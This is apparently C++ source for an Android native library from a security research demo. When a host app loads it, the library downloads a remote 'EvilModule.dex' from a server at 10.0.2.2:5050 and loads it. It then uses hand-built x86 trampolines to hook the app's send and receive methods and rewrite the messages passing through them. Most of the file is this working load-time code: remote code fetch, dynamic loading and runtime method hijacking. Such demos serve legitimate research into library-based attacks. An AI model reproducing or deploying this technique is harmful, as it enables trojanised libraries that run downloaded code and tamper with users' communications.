#include <jni.h>
#include <stdlib.h>
#include<string>
#include <string.h>
#include <errno.h>
#include <stdio.h>

#include <sys/mman.h>


#include <sys/stat.h>


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <netdb.h>
#include <sstream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include<memory>

#include <fstream>

#include "Connection.h"
#include "Downloader.h"
#include "Util.h"
#include "EvilModuleProvider.h"
#include "Hook.h"
#include "test/NativeHook.h"

using namespace std;
using namespace util;



jclass loadClass(jobject loader, const char *, JNIEnv *env) throw(ClassNotFoundException);

Hook* doInBackgroundHook;
Hook* onPostExecuteHook;
static bool hooksAreLoaded = false;
static jclass evilModuleClass = NULL;
static jobject evilModuleClassRef = NULL;
static jobject loaderRef = NULL;

//java.lang.String evil.evil_module.EvilModule.doInBackgroundHook(java.lang.String[])
unsigned char doInBackgroundHookToNativeTrampoline[] = {
        0x57,  // push edi
        0x56,  // push esi
        0x55,  // push ebp
        0x83, 0xC4, 0xE4,  // add esp, -28
        0x50,  // push eax
        0x89, 0x4C, 0x24, 0x34,  // mov [esp + 52], ecx
        0x89, 0x54, 0x24, 0x38,  // mov [esp + 56], edx
        0xC7, 0x44, 0x24, 0x08, 0x02, 0x00, 0x00, 0x00,  // mov [esp + 8], 2
        0x64, 0x8B, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xc4]  ; top_handle_scope
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x8D, 0x4C, 0x24, 0x04,  // lea ecx, [esp + 4]
        0x64, 0x89, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov fs:[0xc4], ecx  ; top_handle_scope
        0x8B, 0x4C, 0x24, 0x34,  // mov ecx, [esp + 52]
        0x89, 0x4C, 0x24, 0x0C,  // mov [esp + 12], ecx
        0x8B, 0x4C, 0x24, 0x38,  // mov ecx, [esp + 56]
        0x89, 0x4C, 0x24, 0x10,  // mov [esp + 16], ecx
        0x64, 0x89, 0x25, 0x8C, 0x00, 0x00, 0x00,  // mov fs:[0x8c], esp  ; top_quick_frame_method
        0x83, 0xC4, 0xF0,  // add esp, -16
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0xFF, 0x15, 0xC4, 0x01, 0x00, 0x00,  // call fs:[0x1c4]  ; pJniMethodStart
        0x89, 0x44, 0x24, 0x24,  // mov [esp + 36], eax
        0x8B, 0x4C, 0x24, 0x20,  // mov ecx, [esp + 32]
        0x85, 0xC9,  // test ecx, ecx
        0x0F, 0x84, 0x04, 0x00, 0x00, 0x00,  // jz/eq +4 (0x000010ac)
        0x8D, 0x4C, 0x24, 0x20,  // lea ecx, [esp + 32]
        0x89, 0x4C, 0x24, 0x08,  // mov [esp + 8], ecx
        0x8D, 0x4C, 0x24, 0x1C,  // lea ecx, [esp + 28]
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0x8B, 0x0D, 0x9C, 0x00, 0x00, 0x00,  // mov ecx, fs:[0x9c]  ; jni_env
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x8B, 0x4C, 0x24, 0x10,  // mov ecx, [esp + 16]
        0xFF, 0x51, 0x18,  // call [ecx + 24]
        0x89, 0x04, 0x24,  // mov [esp], eax
        0x8B, 0x4C, 0x24, 0x24,  // mov ecx, [esp + 36]
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x4C, 0x24, 0x08,  // mov [esp + 8], ecx
        0x64, 0xFF, 0x15, 0xDC, 0x01, 0x00, 0x00,  // call fs:[0x1dc]  ; pJniMethodEndWithReference
        0x83, 0xC4, 0x10,  // add esp, 16
        0x64, 0x83, 0x3D, 0x84, 0x00, 0x00, 0x00, 0x00,  // cmp fs:[0x84], 0  ; exception
        0x0F, 0x85, 0x07, 0x00, 0x00, 0x00,  // jnz/ne +7 (0x000010fe)
        0x83, 0xC4, 0x20,  // add esp, 32
        0x5D,  // pop ebp
        0x5E,  // pop esi
        0x5F,  // pop edi
        0xC3,  // ret
        0x64, 0x8B, 0x05, 0x84, 0x00, 0x00, 0x00,  // mov eax, fs:[0x84]  ; exception
        0x64, 0xFF, 0x15, 0xB8, 0x02, 0x00, 0x00,  // call fs:[0x2b8]  ; pDeliverException
        0xCC,  // int 3
};

//void evil.evil_module.EvilModule.onPostExecuteHook(java.lang.String)
unsigned char onPostExecuteHookToNativeTrampoline[] = {
        0x57,  // push edi
        0x56,  // push esi
        0x55,  // push ebp
        0x83, 0xC4, 0xE4,  // add esp, -28
        0x50,  // push eax
        0x89, 0x4C, 0x24, 0x34,  // mov [esp + 52], ecx
        0x89, 0x54, 0x24, 0x38,  // mov [esp + 56], edx
        0xC7, 0x44, 0x24, 0x08, 0x02, 0x00, 0x00, 0x00,  // mov [esp + 8], 2
        0x64, 0x8B, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xc4]  ; top_handle_scope
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x8D, 0x4C, 0x24, 0x04,  // lea ecx, [esp + 4]
        0x64, 0x89, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov fs:[0xc4], ecx  ; top_handle_scope
        0x8B, 0x4C, 0x24, 0x34,  // mov ecx, [esp + 52]
        0x89, 0x4C, 0x24, 0x0C,  // mov [esp + 12], ecx
        0x8B, 0x4C, 0x24, 0x38,  // mov ecx, [esp + 56]
        0x89, 0x4C, 0x24, 0x10,  // mov [esp + 16], ecx
        0x64, 0x89, 0x25, 0x8C, 0x00, 0x00, 0x00,  // mov fs:[0x8c], esp  ; top_quick_frame_method
        0x83, 0xC4, 0xF0,  // add esp, -16
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0xFF, 0x15, 0xC4, 0x01, 0x00, 0x00,  // call fs:[0x1c4]  ; pJniMethodStart
        0x89, 0x44, 0x24, 0x24,  // mov [esp + 36], eax
        0x8B, 0x4C, 0x24, 0x20,  // mov ecx, [esp + 32]
        0x85, 0xC9,  // test ecx, ecx
        0x0F, 0x84, 0x04, 0x00, 0x00, 0x00,  // jz/eq +4 (0x0000119c)
        0x8D, 0x4C, 0x24, 0x20,  // lea ecx, [esp + 32]
        0x89, 0x4C, 0x24, 0x08,  // mov [esp + 8], ecx
        0x8D, 0x4C, 0x24, 0x1C,  // lea ecx, [esp + 28]
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0x8B, 0x0D, 0x9C, 0x00, 0x00, 0x00,  // mov ecx, fs:[0x9c]  ; jni_env
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x8B, 0x4C, 0x24, 0x10,  // mov ecx, [esp + 16]
        0xFF, 0x51, 0x18,  // call [ecx + 24]
        0x8B, 0x4C, 0x24, 0x24,  // mov ecx, [esp + 36]
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0xFF, 0x15, 0xD0, 0x01, 0x00, 0x00,  // call fs:[0x1d0]  ; pJniMethodEnd
        0x83, 0xC4, 0x10,  // add esp, 16
        0x64, 0x83, 0x3D, 0x84, 0x00, 0x00, 0x00, 0x00,  // cmp fs:[0x84], 0  ; exception
        0x0F, 0x85, 0x07, 0x00, 0x00, 0x00,  // jnz/ne +7 (0x000011ea)
        0x83, 0xC4, 0x20,  // add esp, 32
        0x5D,  // pop ebp
        0x5E,  // pop esi
        0x5F,  // pop edi
        0xC3,  // ret
        0x64, 0x8B, 0x05, 0x84, 0x00, 0x00, 0x00,  // mov eax, fs:[0x84]  ; exception
        0x64, 0xFF, 0x15, 0xB8, 0x02, 0x00, 0x00,  // call fs:[0x2b8]  ; pDeliverException
        0xCC,  // int 3
};


//protected String doInBackground(String... messages)
static jstring doInBackgroundNative(JNIEnv* env, jobject sendTask, jobjectArray messages) {

    logE("doInBackgroundNative", "called!");

    if (doInBackgroundHook->isActivated()) {

        jstring message = NULL;
        if (messages != 0) {
            jint size = env->GetArrayLength(messages);
            if (size != 0) {
                message = (jstring) env->GetObjectArrayElement(messages, 0);
            }
        }

        std::ostringstream ss;
        if (message != NULL)
            ss  << env->GetStringUTFChars(message, NULL);
        ss   << " <<< send message was intercepted by evil lib >>>";

        message = env->NewStringUTF(ss.str().c_str());

        env->SetObjectArrayElement(messages, 0, message);
    }

    jmethodID backup = (jmethodID)doInBackgroundHook->getBackupMethod();

    jclass clazz = env->GetObjectClass(sendTask);
    doInBackgroundHook->resetHotnessCount(backup);

    logE("doInBackgroundNative", "backup is: 0x%x", backup);

    return (jstring) env->CallNonvirtualObjectMethod(sendTask, clazz, backup, messages);
}

////void evil.evil_module.EvilModule.onPostExecuteHook(java.lang.String)
static void onPostExecuteNative(JNIEnv* env, jobject sendTask, jstring returnValue) {
    logE("onPostExecuteNative", "called!");

    if (onPostExecuteHook->isActivated()) {
        std::ostringstream ss;
        if (returnValue != NULL) {
            ss  << env->GetStringUTFChars(returnValue, NULL)
                << " <<< received message was intercepted by evil lib >>>";
            returnValue = env->NewStringUTF(ss.str().c_str());
        }
    }

    jmethodID  backup = (jmethodID)onPostExecuteHook->getBackupMethod();
    jclass clazz = env->GetObjectClass(sendTask);
    onPostExecuteHook->resetHotnessCount(backup);
    env->CallNonvirtualVoidMethod(sendTask, clazz, backup, returnValue);
}


static JNINativeMethod methods[] = {
        {"doInBackgroundHook",    "([Ljava/lang/String;)Ljava/lang/String;",                    (void *)&doInBackgroundNative}
};

void setupHooks(JNIEnv* env, jclass evilModuleClass) {
    jclass sendTaskClass = env->FindClass(
            "de/unipassau/fim/reallife_security/demoapp/demoapp/SendTask");

    jobject newRef = env->NewGlobalRef(sendTaskClass);
    
    jmethodID doInBackgroundTarget = env->GetMethodID(sendTaskClass,
                                                      "doInBackground",
                                                      "([Ljava/lang/String;)Ljava/lang/String;");

    jmethodID doInBackgroundHookMethod = env->GetMethodID(evilModuleClass,
                                                          "doInBackgroundHook",
                                                          "([Ljava/lang/String;)Ljava/lang/String;");

    jmethodID doInBackgroundBackup = env->GetMethodID(evilModuleClass,
                                                      "doInBackgroundBackup",
                                                      "([Ljava/lang/String;)Ljava/lang/String;");

    jmethodID onPostExecuteTarget = env->GetMethodID(sendTaskClass,
                                                      "onPostExecute",
                                                      "(Ljava/lang/String;)V");

    jmethodID onPostExecuteHookMethod = env->GetMethodID(evilModuleClass,
                                                          "onPostExecuteHook",
                                                          "(Ljava/lang/String;)V");

    jmethodID onPostExecuteBackup = env->GetMethodID(evilModuleClass,
                                                      "onPostExecuteBackup",
                                                      "(Ljava/lang/String;)V");


    //env->RegisterNatives(evilModuleClass, methods, 1);



    //void* hookArtMethod, void* backupArtMethod, void* targetArtMethod, int nativeHookAddress,unsigned char* trampoline, size_t size
    try {
        doInBackgroundHook = new Hook(doInBackgroundHookMethod,
                                      doInBackgroundBackup,
                                      doInBackgroundTarget,
                                      (int) doInBackgroundNative,
                                      doInBackgroundHookToNativeTrampoline,
                                      sizeof(doInBackgroundHookToNativeTrampoline));

        jclass testClass = env->FindClass(
                "de/unipassau/fim/reallife_security/demoapp/demoapp/SendTask");
        // public native String concat(String str);
        jobject globalRef = env->NewGlobalRef(testClass);
        jmethodID testMethod = env->GetMethodID(testClass, "closeSilently", "(Ljava/io/Closeable;)V");

        logE("doInBackgroundHookMethod", "%i", doInBackgroundHookMethod);

        jmethodID constructor = env->GetMethodID(evilModuleClass, "<init>", "()V");
        jobject obj = env->NewObject(evilModuleClass, constructor);

        jstring message1 = env->NewStringUTF("string!");
        jclass stringClass = env->FindClass("java/lang/String");
        jobjectArray  messages = env->NewObjectArray(1,stringClass, message1);

        //jstring response = (jstring) env->CallNonvirtualObjectMethod(obj, evilModuleClass, doInBackgroundBackup, messages);

        //logE("response", "%s", env->GetStringUTFChars(response, NULL));

        /*doInBackgroundHook = new NativeHook(doInBackgroundHookMethod, doInBackgroundTarget, doInBackgroundBackup, (int) (size_t)doInBackgroundNative,
                                            doInBackgroundHookToNativeTrampoline,
                                            sizeof(doInBackgroundHookToNativeTrampoline),
                                            testMethod);*/

        doInBackgroundHook->activate(false);
    } catch (HookException e) {
        logE("setupHooks", "Couldn't create doInBackgroundHook: %s", e.what());
    }

    try {
        onPostExecuteHook = new Hook(onPostExecuteHookMethod,
                                     onPostExecuteBackup,
                                     onPostExecuteTarget,
                                     (int) onPostExecuteNative,
                                     onPostExecuteHookToNativeTrampoline,
                                     sizeof(onPostExecuteHookToNativeTrampoline));


        onPostExecuteHook->activate(false);
    } catch (HookException e) {
        logE("setupHooks", "Couldn't create onPostExecuteHook: %s", e.what());
    }

}

/**
 * Hooks send and receive methods of the benign app
 * @param env The current JNI environment
 */
void doHooking(JNIEnv* env) {

    if (hooksAreLoaded) return;

    string evilModulePath;
    EvilModuleProvider provider(Service ("10.0.2.2", 5050));
    try {
        evilModulePath = provider.downloadEvilModule(env, "EvilModule.dex");
    } catch(DownloadException e) {
        logE("EVIL_LIB::doHooking", "Couldn't download evil module: Cause: %s", e.what());
        return;
    }

    logE("EVIL_LIB::doHooking", "Successfully downloaded evil module: %s", evilModulePath.c_str());


    jobject loader = createDexClassLoader(evilModulePath.c_str(), env);

    if (loader == NULL) {
        logE("EVIL_LIB::doHooking", "Couldn't create dex classloader!");
        return;
    }

    //make a global ref so that gc doesn't interfere
    loaderRef = env->NewGlobalRef(loader);

    try {
        evilModuleClass = loadClass(loader, "evil.evil_module.EvilModule", env);

        //make a global ref so that gc doesn't interfere
        evilModuleClassRef = env->NewGlobalRef(evilModuleClass);

    } catch (ClassNotFoundException e) {
        logE("EVIL_LIB::doHooking", "Couldn't load EvilModule: %s", e.what());
        return;
    }


    logE("EVIL_LIB::doHooking", "Successfully loaded evil module");

    setupHooks(env, evilModuleClass);

    hooksAreLoaded = true;
}


jclass loadClass(jobject loader, const char* className, JNIEnv *env) throw(ClassNotFoundException){

    // Get function ClassLoader.loadClass()
    jclass loaderClass = env->GetObjectClass(loader);
    jmethodID classLoadClass = env->GetMethodID(loaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");

    // load the evil module
    jstring classNameJava = env->NewStringUTF(className);
    jclass evilModuleClass = (jclass) env->CallObjectMethod(loader, classLoadClass, classNameJava);
    evilModuleClass = (jclass) env->NewGlobalRef(evilModuleClass);

    bool evilModuleLoaded = !env->ExceptionCheck();

    if (!evilModuleLoaded) {

        jthrowable exception = env->ExceptionOccurred();
        env->ExceptionClear();
        jstring message = getExceptionMessage(env, exception);

        const char* msg = env->GetStringUTFChars(message, NULL);

        std::string messageObject(msg);
        env->ReleaseStringUTFChars(message, msg);

        ostringstream ss;
        ss << "Couldn't load class: " << messageObject.c_str();
        throw ClassNotFoundException(ss.str());
    }

    return evilModuleClass;
}

extern "C"
JNIEXPORT void JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_activateHookJNI(JNIEnv *env,
                                                                                      jobject instance) {

    if (doInBackgroundHook) doInBackgroundHook->activate(true);
    if (onPostExecuteHook) onPostExecuteHook->activate(true);

}extern "C"
JNIEXPORT void JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_deactivateHookJNI(JNIEnv *env,
                                                                                        jobject instance) {

    if (doInBackgroundHook) doInBackgroundHook->activate(false);
    if (onPostExecuteHook) onPostExecuteHook->activate(false);

}

extern "C"
JNIEXPORT jstring
JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_stringFromJNI(
        JNIEnv *env,
        jobject /* this */) {
    const char* hello = "Hello from C++";
    return env->NewStringUTF(hello);
}


/**
 * Called when the library is loaded by the benign app.
 * @param vm The JVM
 * @param reserved nothing important
 * @return The current JNI version or -1, if an error occured
 */
jint JNI_OnLoad(JavaVM* vm, void* reserved)
{
    // Get the JNI environment
    JNIEnv* env;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return -1;
    }

    // Hook the benign app
    doHooking(env);

    logE("EVIL_LIB::stringFromJNI", "Done");

    return JNI_VERSION_1_6;
}